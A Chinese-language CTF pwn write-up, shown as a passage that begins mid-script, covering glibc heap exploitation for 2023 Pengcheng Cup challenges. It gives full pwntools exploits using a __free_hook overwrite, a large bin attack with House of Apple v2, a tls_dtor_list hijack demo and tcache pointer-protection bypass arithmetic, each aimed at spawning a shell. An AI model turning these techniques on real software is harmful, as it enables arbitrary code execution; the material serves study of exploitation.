class="number">0x4062F0</span></span><br><span class="line">stderr = <span class="number">0x4062e0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">4</span>, p64(cofflist))</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">2</span>, p64(stderr))</span><br><span class="line">show()</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1ed5c0</span></span><br><span class="line">lg(<span class="string">&#x27;libc.address&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">4</span>, p64(libc.sym.__free_hook))</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">2</span>, p64(libc.sym.system))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>出题人很好心的给出了一个堆地址，这样就可以在堆合并时，绕过unlink_chunk的assert</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>问题出现在 读取数据中，存在一个堆溢出写0</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">read_con</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ptr[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们size的限制，这个大小的bin为 tcache, unsorted, large bin</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">size &gt; <span class="number">0x3FF</span> &amp;&amp; size &lt;= <span class="number">0x500</span></span><br></pre></td></tr></table></figure>

<p>泄露出地址，<code>large bin attack</code>，使用house of apple 手段。</p>
<ul>
<li>a-b-c，在a伪造一个堆，但是因为使用puts函数进行show，但是会存在<code>\x00</code> 截断问题，可以将a伪造成一个 free_chunk，并且会因为arena地址无法leak成功。因此需要堆风水一下，让large bin arena最后一字节不为0。</li>
<li>free b, a-b 合并，malloc d, a &amp; d指向同一个chunk，就可以有类似uaf的效果。</li>
<li>large bin attack 的手段： free a, a放入largebin 里，利用d修改a的 <code>bk_nextsize</code> 为  <code>io_list_all-0x20</code> ，释放一个比<code>a</code> size小的chunk <code>e</code>，将<code>e</code>放入large bin里。这样 <code>io_list_all =&gt; heap a</code></li>
<li>house_of_apple：利用d修改a内容，伪造一个<code>fake_io</code></li>
<li>退出，IO流，并且此题没有沙箱</li>
</ul>
<p>house of apple 的exp如下</p>
<ul>
<li>但是这是在我kali的glibc 2.37 下进行的，在libc2.38 patch后会因为arena最后一个字节为0而无法成功，😫，不想风水了</li>
<li>最后凑一个 <code>rdi/flag</code> 。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>): <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> p.recvline(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>):</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;babyheap&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz, con</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, sz, con</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">heap_base = heap_addr - <span class="number">0x2a0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;a\n&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x410</span>: <span class="number">0x420</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x418</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1d3ce0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x420</span>: <span class="number">0x430</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x428</span>, payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ## large bin attack =&gt; IO_list_all -&gt; chunk0</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x18</span>: libc.sym._IO_list_all - <span class="number">0x20</span>,</span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # house of apple v2</span></span><br><span class="line">fs = FileStructure()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line"><span class="comment"># write_base &lt; write_ptr</span></span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line"><span class="comment"># fs._lock = libc.sym._IO_stdfile_2_lock</span></span><br><span class="line"><span class="comment"># lock 检查</span></span><br><span class="line">fs._lock = libc.address + <span class="number">0x1d5a20</span></span><br><span class="line"><span class="comment"># # codecvt = ?</span></span><br><span class="line"><span class="comment"># fs._codecvt = ?</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xff0</span> + <span class="number">0x500</span></span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">wdata = fit(&#123;</span><br><span class="line">    <span class="number">0xe0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(wdata) + <span class="number">1</span>, wdata + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;heap_addr&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x4f0</span> + <span class="string">b&quot;     sh;&quot;</span>  <span class="comment"># flag rdi</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>


<p>主要利用large bin leak，但是因为其可以使用tcache bin，看到了其他的利用手段</p>
<ul>
<li>最终tcache修改TLS，通过__call_tls_dtors函数实现system(“&#x2F;bin&#x2F;sh”)</li>
<li>IO leak 栈地址，然后跳转到栈上进行指向函数。</li>
</ul>
<h3 id="tls-dtor"><a href="#tls-dtor" class="headerlink" title="tls_dtor"></a>tls_dtor</h3><p>一种比较简单的利用手段，正常情况下存在如下的调用链</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">	__run_exit_handlers</span><br><span class="line">		__call_tls_dtors</span><br></pre></td></tr></table></figure>

<p>其函数实现如下</p>
<ul>
<li>一个全局变量是否存在</li>
<li>找到其函数指针</li>
<li><code>PTR_DEMANGLE</code> 计算函数地址</li>
<li>调用函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *cur = tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line">      <span class="built_in">PTR_DEMANGLE</span> (func);</span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      <span class="built_in">func</span> (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">	 potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      <span class="built_in">atomic_fetch_add_release</span> (&amp;cur-&gt;map-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (__call_tls_dtors)</span><br></pre></td></tr></table></figure>

<p>其结构体如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*dtor_func)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// destructor list</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">dtor_list</span></span><br><span class="line">&#123;</span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>PTR_DEMANGLE 这个宏计算函数地址</p>
<ul>
<li>循环右移0x11位</li>
<li>与 pointer_guard 进行异或</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> PTR_DEMANGLE(reg)	ror $2*LP_SIZE+1, reg;			      \</span></span><br><span class="line"><span class="meta">				xor %fs:POINTER_GUARD, reg</span></span><br></pre></td></tr></table></figure>

<p>正常情况下，这个值为0，不会调用如下的函数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p tls_dtor_list</span><br><span class="line"><span class="variable">$1</span> = (struct dtor_list *) 0x0</span><br></pre></td></tr></table></figure>

<p>因为这里没有什么检查，因此我们可以攻击这个值，让其指向我们伪造的一个 <code>dtor_list</code> 结构体。</p>
<ul>
<li>func 首先获得地址，先于 pointer_guard 进行异或，然后在进行循环左移11位</li>
<li>obj 作为函数参数指针。</li>
</ul>
<p>在汇编中</p>
<ul>
<li>tls_dtor_list 也在 fs 附近</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> tls_dtor_list=1   <span class="comment"># 进入循环，寻找偏移</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p <span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$4</span> = (void *) 0xffffffffffffffb0</span><br><span class="line">pwndbg&gt; p (long)<span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$5</span> = -80</span><br><span class="line"></span><br><span class="line">0x7ffff7e02606 &lt;__call_tls_dtors+6&gt;     mov    rbp, qword ptr [rip + 0x194773]</span><br><span class="line">0x7ffff7e0260d &lt;__call_tls_dtors+13&gt;    mov    rbx, qword ptr fs:[rbp]</span><br><span class="line">0x7ffff7e02612 &lt;__call_tls_dtors+18&gt;    <span class="built_in">test</span>   rbx, rbx                        <span class="comment"># 这里就是tls_dtor_list 值</span></span><br><span class="line">0x7ffff7e02615 &lt;__call_tls_dtors+21&gt;    je     __call_tls_dtors+94                &lt;__call_tls_dtors+94&gt;</span><br><span class="line">0x7ffff7e02617 &lt;__call_tls_dtors+23&gt;    nop    word ptr [rax + rax]</span><br><span class="line">► 0x7ffff7e02620 &lt;__call_tls_dtors+32&gt;    mov    rdx, qword ptr [rbx + 0x18]   <span class="comment"># next 指针</span></span><br><span class="line">0x7ffff7e02624 &lt;__call_tls_dtors+36&gt;    mov    rax, qword ptr [rbx]            <span class="comment"># func</span></span><br><span class="line">0x7ffff7e02627 &lt;__call_tls_dtors+39&gt;    ror    rax, 0x11                       <span class="comment"># 循环右移</span></span><br><span class="line">0x7ffff7e0262b &lt;__call_tls_dtors+43&gt;    xor    rax, qword ptr fs:[0x30]        <span class="comment"># pointer_guard </span></span><br><span class="line">0x7ffff7e02634 &lt;__call_tls_dtors+52&gt;    mov    qword ptr fs:[rbp], rdx</span><br><span class="line">0x7ffff7e02639 &lt;__call_tls_dtors+57&gt;    mov    rdi, qword ptr [rbx + 8]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/xg <span class="variable">$fs_base</span>+0x30</span><br><span class="line">0x7ffff7dc1770: 0x851e64b26accf332</span><br></pre></td></tr></table></figure>

<p>我们需要将伪造的结构体中函数地址进行一个移位运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="keyword">return</span> ((addr &lt;&lt; <span class="number">0x11</span>) &amp; <span class="number">0xffffffffffffffff</span>) | (addr &gt;&gt; <span class="number">0x2f</span>)</span><br></pre></td></tr></table></figure>

<p>一个小demo，来自 <a href="https://zhuanlan.zhihu.com/p/654914149">glibc2.35-通过tls_dtor_list劫持exit执行流程</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">rotate_left</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value, <span class="type">int</span> left)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (value &lt;&lt; left) | (value &gt;&gt; (<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) * <span class="number">8</span> - left));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fs_base;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> index = <span class="number">0xffffffffffffffa8</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> tls_dtor_list_addr;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> random_number;</span><br><span class="line">  <span class="type">void</span> *system_ptr = (<span class="type">void</span> *)&amp;system;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system:%p\n&quot;</span>, system_ptr);</span><br><span class="line">  <span class="built_in">asm</span>(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(fs_base));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value in FS register: 0x%llx\n&quot;</span>, fs_base);</span><br><span class="line">  tls_dtor_list_addr = fs_base - <span class="number">80</span>;</span><br><span class="line">  random_number = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(fs_base + <span class="number">0x30</span>);</span><br><span class="line">  <span class="type">char</span> *str_bin_sh = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(str_bin_sh, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)ptr =</span><br><span class="line">      <span class="built_in">rotate_left</span>((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)system_ptr ^ random_number, <span class="number">0x11</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(ptr + <span class="number">8</span>) = str_bin_sh;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)tls_dtor_list_addr = ptr;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在高版本 的 tcache bin attack 里也可以使用这个。</p>
<ul>
<li>tcache fd 加密问题。</li>
</ul>
<p>如下为 chunk 放入 tcache bin 相关的函数。</p>
<ul>
<li>因为 header 的存在，第一步将 chunk 转化成 tcache_entry</li>
<li>key 为一个随机数</li>
<li>next指针计算，next指针的地址右移12位，然后与 <code>prev tcache bin</code> 指针进行 <code>xor</code> 运算。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> *next;                <span class="comment">// 常说的 fd 指针 </span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_perthread_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> </span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)<span class="built_in">chunk2mem</span>(chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;      <span class="comment">// 一个随机数，tcache_key_initialize (void) 生成</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = <span class="built_in">PROTECT_PTR</span>(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以做一个测试，查看tcache 的next指针。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592a0: 0x0000000555555559      0xa8d3bb0dc1ab0725</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592f0: 0x000055500000c7f9      0xa8d3bb0dc1ab0725</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x (0x5555555592f0 &gt;&gt; 12) ^ 0x5555555592a0</span><br><span class="line"><span class="variable">$1</span> = 0x55500000c7f9</span><br></pre></td></tr></table></figure>

<p>因此我们伪造fd。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(addr &gt;&gt; <span class="number">12</span>) ^ pos</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://kagehutatsu.com/?p=951">2023 鹏城杯 Pwn 部分Writeup</a></li>
<li><a href="https://blog.xmcve.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF2023-Writeup/#title-7">鹏城杯2023 Writeup</a></li>
